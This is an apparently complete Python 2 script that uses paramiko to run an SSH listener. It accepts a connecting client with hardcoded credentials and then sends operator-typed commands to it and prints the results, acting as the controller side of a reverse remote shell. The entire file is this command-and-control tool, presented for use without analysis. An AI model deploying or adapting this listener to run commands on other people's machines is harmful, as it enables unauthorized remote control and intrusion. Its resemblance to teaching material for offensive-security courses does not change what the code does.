import paramiko
import socket
import threading
import sys
import getpass

__author__ = "AlphaLU"
rsa_path = ''
host = ''
port = 22
currUser = getpass.getuser()
host_key = paramiko.RSAKey(filename=rsa_path)


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == '') and (password == ''):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(100)
    print '[*] Server Started'
    print '[+] Listening for incoming connections...'
    client, addr = s.accept()
except Exception, e:
    print '[-] Listen/bind/accept failed - reason : ' + str(e)
    sys.exit(1)
print '[*] Connection received, IP : ' + str(addr)

try:
    t = paramiko.Transport(client)
    try:
        t.load_server_moduli()
    except:
        print 'failed'
        raise
    t.add_server_key(host_key)
    server = Server()
    try:
        t.start_server(server=server)
    except paramiko.SSHException, x:
        print '[-] SSH negotiation failed'

    chan = t.accept(20)
    print '[+] Authenticated'
    print chan.recv(1024)
    chan.send('Welcome')
    while True:
        command = raw_input('Enter command >> ').strip('\n')
        chan.send(command)
        print chan.recv(1024) + '\n'

except Exception, e:
    print '[-] Caught exception: ' + str(e.__class__) + ': ' + str(e)
    try:
        t.close()
    except:
        pass
    sys.exit(1)
